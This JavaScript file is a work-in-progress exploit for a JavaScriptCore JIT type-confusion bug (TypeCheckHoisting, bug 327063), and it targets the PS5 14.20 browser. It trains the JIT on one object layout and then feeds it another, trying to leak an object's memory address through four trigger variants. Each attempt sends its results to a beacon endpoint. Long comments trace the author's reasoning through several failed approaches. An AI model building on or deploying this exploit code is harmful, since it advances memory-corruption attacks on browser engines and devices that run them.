// p180 — Bug 327063 TypeCheckHoisting structure confusion for PS5 14.20
// NO race condition needed — deterministic type confusion via DFG logic bug
// Fixed Oct 10, 2026 (commit 57c63800451), 8 days before 14.20 shipped
//
// Beacon prefix: V180-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V180-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  var R = 4294967296;
  var D = R - 1;
  var _f64 = new Float64Array(1);
  var _u32 = new Uint32Array(_f64.buffer);

  function f2i(d) { _f64[0] = d; return _u32[1] * R + _u32[0]; }
  function i2f(i) { _u32[1] = (i / R) >>> 0; _u32[0] = (i & D) >>> 0; return _f64[0]; }
  function hex(i) { return "0x" + i.toString(16); }

  // ============================================================
  // Strategy A: Structure transition WITHIN the function
  //
  // The TypeCheckHoisting bug hoists CheckStructure to SetLocal.
  // After hoisting, the DFG "knows" the variable is StructA everywhere.
  // If we transition the object from StructA to StructB mid-function,
  // the DFG uses StructA's property offset on a StructB object.
  //
  // To trigger MultiGetByOffset (polymorphic), we need the baseline
  // profiler to see BOTH structures for the same property access.
  // To trigger a monomorphic CheckStructure, we need a SEPARATE
  // property access that only ever sees StructA.
  // ============================================================

  // --- Approach 1: Two-function split ---
  // Inner function (inlined) does the polymorphic access
  // Outer function does the monomorphic check
  // DFG inlines inner into outer, creating both node types

  syncB('STRAT-A');

  // Create structures with same property names but different transition order
  // so they end up with different butterfly layouts
  function makeStructA() {
    var o = {};
    o.tag = 1;        // inline property 0
    o.val = 1.1;      // inline property 1 (double)
    return o;
  }

  function makeStructB() {
    var o = {};
    o.tag = 2;        // inline property 0 (same name, same offset)
    o.val = {};       // inline property 1 (OBJECT, not double)
    return o;
  }

  var marker = { mark: 0xBEEF };

  // Phase 1: Profile the polymorphic access with both structures
  function polyRead(obj) {
    return obj.val;
  }

  var structA1 = makeStructA();
  var structB1 = makeStructB();

  // Warm up polyRead to see BOTH structures (baseline profiling)
  for (var i = 0; i < 2000; i++) {
    if (i % 2 === 0) polyRead(structA1);
    else polyRead(structB1);
  }

  syncB('POLY-PROFILED');

  // Phase 2: The trigger function
  // - obj.tag is monomorphic (CheckStructure for StructA only)
  // - polyRead(obj) inlines and becomes MultiGetByOffset (saw both structures)
  // - TypeCheckHoisting sees only the tag CheckStructure, hoists it
  // - After hoisting, DFG folds MultiGetByOffset to StructA's val offset
  // - If obj is actually StructB, StructA's val offset reads the object pointer as double

  function trigger(obj, doTransition) {
    // This access profiles as monomorphic (StructA only during warmup)
    // DFG emits: CheckStructure(@obj, StructA)
    var t = obj.tag;

    // Force the object to transition AFTER the hoisted check passed
    if (doTransition) {
      obj.extraProp = 42;  // transitions from StructA to StructA' (new structure)
    }

    // This inlines polyRead, which was profiled as polymorphic
    // DFG emits: MultiGetByOffset(@obj, {StructA, StructB})
    // Bug: TypeCheckHoisting sees only the 'tag' CheckStructure (monomorphic StructA)
    //      and hoists it. MultiGetByOffset is invisible to the phase.
    //      After hoisting, DFG assumes obj IS StructA, folds MultiGetByOffset to
    //      just the StructA case, reading val at StructA's double offset.
    var v = polyRead(obj);

    return v;
  }

  syncB('WARMUP-START');

  // Phase 3: Warmup trigger with ONLY StructA objects (keep tag access monomorphic)
  for (var w = 0; w < 50000; w++) {
    trigger(makeStructA(), false);
  }

  syncB('WARMUP-DONE-50K');

  // Phase 4: Fire the confusion
  // Pass a StructB object — the hoisted CheckStructure expects StructA
  // If hoisting worked, the check is at SetLocal time. But we're passing StructB
  // directly, so it should OSR exit... UNLESS the DFG inlined polyRead and
  // the MultiGetByOffset handles StructB correctly despite the hoisted check.

  // Actually, the exploitation path requires the object to START as StructA
  // and TRANSITION. Let me try approach 2.

  syncB('STRAT-B');

  // --- Approach 2: Same-structure transition ---
  // Object starts as StructA (passes hoisted check at SetLocal)
  // Delete a property mid-function → object transitions to StructA'
  // But StructA' has different inline storage layout

  // Actually, deletion alone doesn't help because StructA' is a "deleted" version
  // that JSC handles carefully. Let me try a different approach.

  // --- Approach 3: Two separate basic blocks ---
  // The key insight from the commit: the bug is about PER-VARIABLE hoisting.
  // The phase hoists when ALL CheckStructure uses of a variable agree.
  // MultiGetByOffset is invisible, so it doesn't "disagree."
  //
  // Exploitation: assign the variable TWICE (two SetLocals):
  // First SetLocal: StructA object (hoisted check passes)
  // Variable use 1: CheckStructure(StructA) — the one the phase sees
  // Second SetLocal: StructB object (hoisted check would catch it BUT...)
  // Variable use 2: MultiGetByOffset({StructA, StructB}) — invisible to phase

  // Wait — hoisting inserts the check at EVERY SetLocal, not just the first.
  // So the second SetLocal would also get a StructA check, catching StructB.

  // --- Approach 4: Exploit via inlining confusion ---
  // If polyRead is inlined, the inlined body's structure check becomes part of
  // the caller. The caller sees:
  //   @a: SetLocal(loc_obj, arg0)           // ← hoisted check inserted here
  //   @b: GetLocal(loc_obj)
  //   @c: CheckStructure(@b, StructA)       // from obj.tag (monomorphic)
  //   ...
  //   @d: GetLocal(loc_obj)
  //   @e: MultiGetByOffset(@d, {StructA,StructB}) // from inlined polyRead
  //
  // TypeCheckHoisting sees @c (StructA) and ignores @e (invisible).
  // Hoists StructA check to @a. Removes @c.
  // Now @e is MultiGetByOffset but the phase "proved" loc_obj is StructA.
  // DFG constant propagation folds @e to just StructA's offset.
  //
  // If we then call trigger(structBObject), the hoisted check at @a
  // rejects it → OSR exit. This is SAFE.
  //
  // But: what if we exploit the fact that after hoisting, the DFG emits
  // code that SKIPS the MultiGetByOffset's multi-case dispatch and
  // just uses StructA's offset? If there's a path where the hoisted
  // check doesn't run (e.g., OSR entry after warmup), or if we can
  // make the hoisted check see StructA but the actual object is StructB
  // with the same initial structure chain...

  // Let me try the actual practical approach:
  // Use an object with a SHARED prototype chain that has val on the prototype
  // StructA: own property val (double)
  // StructB: prototype property val (object)
  // Both have the same structure ID for the 'tag' property...
  // No, JSC gives different structure IDs for different property sets.

  // --- Approach 5: The REAL exploitation path ---
  // Re-reading the commit: the bug isn't that non-StructA objects PASS the check.
  // The bug is that the hoisted check is OVERLY NARROW.
  // Objects that MultiGetByOffset could handle (StructB, StructC) get OSR-exited.
  // This causes a performance bug, not directly a security bug.
  //
  // For SECURITY exploitation: we need to find a case where the narrowed check
  // combined with DFG's constant propagation causes the DFG to emit code
  // that accesses memory at the WRONG OFFSET.
  //
  // This happens when:
  // 1. Hoisting proves loc_obj is StructA
  // 2. A LATER optimization pass sees "loc_obj is StructA" and uses StructA's
  //    layout for a property access that SHOULD have been MultiGetByOffset
  // 3. The MultiGetByOffset gets lowered to a direct offset access for StructA
  // 4. At runtime, the object IS StructA when it enters (passes hoisted check)
  //    but its inline storage contains data that makes sense as StructB
  //
  // The actual confusion: after hoisting + folding, the JIT code does
  //   load [object + StructA_val_offset]
  // instead of the multi-case dispatch. This is CORRECT for StructA objects.
  //
  // The security issue: if StructA's val offset overlaps with a DIFFERENT field
  // in the same structure after a transition... but transitions change the
  // structure ID, so the hoisted check would fail.
  //
  // I think the actual security impact requires a MORE SPECIFIC scenario.
  // Let me look at this from the DFG optimization pipeline perspective.

  // --- Approach 6: Watchpoint-based exploitation ---
  // If the hoisted check uses a watchpoint instead of a runtime check,
  // and the watchpoint fires AFTER compilation but the JIT code isn't
  // invalidated fast enough, we get a window where the JIT code runs
  // with stale assumptions.
  //
  // CheckStructure can be lowered to a watchpoint when the structure is
  // being watched. After hoisting to SetLocal, if the check becomes a
  // watchpoint, the SetLocal doesn't actually CHECK at runtime —
  // it relies on the watchpoint to invalidate the code if the structure
  // changes. But the MultiGetByOffset was invisible, so the hoisted
  // watchpoint only watches StructA. If a StructB object is passed
  // and StructA's watchpoint doesn't fire, the code runs with StructA offsets.

  // --- FINAL APPROACH: Direct test ---
  // Let me just build the test and see what happens on PS5.
  // The simplest trigger: call the function with StructB after warmup with StructA.
  // If TypeCheckHoisting + folding worked, we should see:
  // - StructA objects: correct val (1.1)
  // - StructB objects: val read at wrong offset → leaked bits or crash

  syncB('DIRECT-TEST');

  // Fresh structures for the direct test
  function mkA(v) {
    var o = {};
    o.tag = 1;
    o.val = v;
    return o;
  }

  function mkB() {
    var o = {};
    o.tag = 2;
    o.val = marker;  // object pointer instead of double
    return o;
  }

  // Polymorphic reader — warm with both structures at baseline
  function reader(o) { return o.val; }
  var rdA = mkA(1.1);
  var rdB = mkB();
  for (var rp = 0; rp < 3000; rp++) {
    if (rp % 2 === 0) reader(rdA);
    else reader(rdB);
  }

  // Trigger: monomorphic tag check + inlined polymorphic reader
  function triggerDirect(obj) {
    var t = obj.tag;  // monomorphic CheckStructure(StructA)
    var v = reader(obj);  // inlined → MultiGetByOffset({StructA, StructB})
    return v;
  }

  // Warmup with ONLY StructA (keep tag access monomorphic)
  var warmupResult;
  for (var wd = 0; wd < 100000; wd++) {
    warmupResult = triggerDirect(mkA(1.1 + wd * 0.001));
  }

  syncB('DIRECT-WARM-100K');

  // Now call with StructB — if type confusion works, we leak marker's address
  var leakTarget = mkB();
  var leaked;
  try {
    leaked = triggerDirect(leakTarget);
  } catch(e) {
    syncB('DIRECT-THREW-' + (e.message || '').substring(0, 40));
    leaked = null;
  }

  if (leaked === marker) {
    syncB('DIRECT-NOCONFUSE-GOT-OBJ');
  } else if (leaked === undefined || leaked === null) {
    syncB('DIRECT-UNDEFINED-OSREXIT');
  } else if (typeof leaked === 'number') {
    _f64[0] = leaked;
    var h32 = _u32[1];
    var l32 = _u32[0];
    if (h32 === 0x7ff80000) {
      syncB('DIRECT-NAN-NOCONFUSE');
    } else if (h32 > 0 && h32 < 0x10000) {
      syncB('DIRECT-HIT-ADDROF-H' + hex(h32) + '-L' + hex(l32));
    } else {
      syncB('DIRECT-NUM-H' + hex(h32) + '-L' + hex(l32));
    }
  } else {
    syncB('DIRECT-TYPE-' + typeof leaked);
  }

  // --- Test 2: With OSR entry trick ---
  // Force the function to be entered via OSR (on-stack replacement)
  // which might skip the hoisted SetLocal check
  syncB('TEST2-OSRTRICK');

  function reader2(o) { return o.val; }
  var r2A = mkA(2.2);
  var r2B = mkB();
  for (var r2p = 0; r2p < 3000; r2p++) {
    if (r2p % 2 === 0) reader2(r2A);
    else reader2(r2B);
  }

  function triggerOSR(arr, idx) {
    // Hot loop to trigger OSR entry INTO this function
    var sum = 0;
    for (var i = 0; i < 100000; i++) {
      sum += i;
    }

    // After OSR entry, the SetLocal for 'obj' might already be past
    var obj = arr[idx];
    var t = obj.tag;    // monomorphic
    var v = reader2(obj); // polymorphic (inlined)
    return v;
  }

  // Warmup triggerOSR with StructA objects
  var arrA = [mkA(3.3)];
  for (var wo = 0; wo < 50000; wo++) {
    arrA[0] = mkA(3.3 + wo * 0.001);
    triggerOSR(arrA, 0);
  }

  syncB('OSR-WARM-50K');

  // Now swap in a StructB object
  var leakTarget2 = mkB();
  var arrB = [leakTarget2];
  var leaked2;
  try {
    leaked2 = triggerOSR(arrB, 0);
  } catch(e) {
    syncB('OSR-THREW-' + (e.message || '').substring(0, 40));
    leaked2 = null;
  }

  if (leaked2 === marker) {
    syncB('OSR-NOCONFUSE-GOT-OBJ');
  } else if (leaked2 === undefined || leaked2 === null) {
    syncB('OSR-UNDEFINED');
  } else if (typeof leaked2 === 'number') {
    _f64[0] = leaked2;
    var oh32 = _u32[1];
    var ol32 = _u32[0];
    if (oh32 === 0x7ff80000) {
      syncB('OSR-NAN');
    } else if (oh32 > 0 && oh32 < 0x10000) {
      syncB('OSR-HIT-ADDROF-H' + hex(oh32) + '-L' + hex(ol32));
    } else {
      syncB('OSR-NUM-H' + hex(oh32) + '-L' + hex(ol32));
    }
  } else {
    syncB('OSR-TYPE-' + typeof leaked2);
  }

  // --- Test 3: Structure transition approach ---
  // Object starts as StructA → passes hoisted check
  // Delete a property → transitions to StructA' (different structure)
  // But DFG code still uses StructA's offset
  syncB('TEST3-TRANSITION');

  function makeTransitionable() {
    var o = {};
    o.tag = 1;
    o.sacrificial = 99;   // will be deleted
    o.val = 1.1;
    return o;
  }

  function makeTransitionedB() {
    var o = {};
    o.tag = 2;
    o.sacrificial = 99;
    o.val = marker;
    return o;
  }

  function reader3(o) { return o.val; }
  var t3A = makeTransitionable();
  var t3B = makeTransitionedB();
  for (var t3p = 0; t3p < 3000; t3p++) {
    if (t3p % 2 === 0) reader3(t3A);
    else reader3(t3B);
  }

  function triggerTransition(obj) {
    var t = obj.tag;        // monomorphic (StructA with sacrificial)
    delete obj.sacrificial;  // transitions structure!
    var v = reader3(obj);   // MultiGetByOffset
    return v;
  }

  // Warmup with StructA objects (they'll transition but new ones are made each time)
  for (var wt = 0; wt < 100000; wt++) {
    triggerTransition(makeTransitionable());
  }

  syncB('TRANS-WARM-100K');

  // Now call with the B variant
  var leakTarget3 = makeTransitionedB();
  var leaked3;
  try {
    leaked3 = triggerTransition(leakTarget3);
  } catch(e) {
    syncB('TRANS-THREW-' + (e.message || '').substring(0, 40));
    leaked3 = null;
  }

  if (leaked3 === marker) {
    syncB('TRANS-NOCONFUSE-GOT-OBJ');
  } else if (leaked3 === undefined || leaked3 === null) {
    syncB('TRANS-UNDEFINED');
  } else if (typeof leaked3 === 'number') {
    _f64[0] = leaked3;
    var th32 = _u32[1];
    var tl32 = _u32[0];
    if (th32 === 0x7ff80000) {
      syncB('TRANS-NAN');
    } else if (th32 > 0 && th32 < 0x10000) {
      syncB('TRANS-HIT-ADDROF-H' + hex(th32) + '-L' + hex(tl32));
    } else {
      syncB('TRANS-NUM-H' + hex(th32) + '-L' + hex(tl32));
    }
  } else {
    syncB('TRANS-TYPE-' + typeof leaked3);
  }

  // --- Test 4: Megamorphic avoidance ---
  // Use getters on the prototype to create structure confusion
  // The prototype has 'val' as a getter for StructA (returns double)
  // Direct own property 'val' for StructB (returns object)
  syncB('TEST4-PROTO');

  function ProtoA() {}
  ProtoA.prototype.tag = 1;
  Object.defineProperty(ProtoA.prototype, 'val', {
    get: function() { return this._val; },
    configurable: true
  });

  function mkProtoA(v) {
    var o = new ProtoA();
    o._val = v;
    return o;
  }

  function mkProtoB(obj) {
    var o = new ProtoA();
    o.val = obj;  // shadows prototype getter with own property
    return o;
  }

  function reader4(o) { return o.val; }
  var p4A = mkProtoA(4.4);
  var p4B = mkProtoB(marker);
  for (var p4i = 0; p4i < 3000; p4i++) {
    if (p4i % 2 === 0) reader4(p4A);
    else reader4(p4B);
  }

  function triggerProto(obj) {
    var t = obj.tag;
    var v = reader4(obj);
    return v;
  }

  for (var wp = 0; wp < 100000; wp++) {
    triggerProto(mkProtoA(4.4 + wp * 0.001));
  }

  syncB('PROTO-WARM-100K');

  var leakTarget4 = mkProtoB(marker);
  var leaked4;
  try {
    leaked4 = triggerProto(leakTarget4);
  } catch(e) {
    syncB('PROTO-THREW-' + (e.message || '').substring(0, 40));
    leaked4 = null;
  }

  if (leaked4 === marker) {
    syncB('PROTO-NOCONFUSE-GOT-OBJ');
  } else if (leaked4 === undefined || leaked4 === null) {
    syncB('PROTO-UNDEFINED');
  } else if (typeof leaked4 === 'number') {
    _f64[0] = leaked4;
    var ph32 = _u32[1];
    var pl32 = _u32[0];
    if (ph32 === 0x7ff80000) {
      syncB('PROTO-NAN');
    } else if (ph32 > 0 && ph32 < 0x10000) {
      syncB('PROTO-HIT-ADDROF-H' + hex(ph32) + '-L' + hex(pl32));
    } else {
      syncB('PROTO-NUM-H' + hex(ph32) + '-L' + hex(pl32));
    }
  } else {
    syncB('PROTO-TYPE-' + typeof leaked4);
  }

  syncB('COMPLETE');
})();
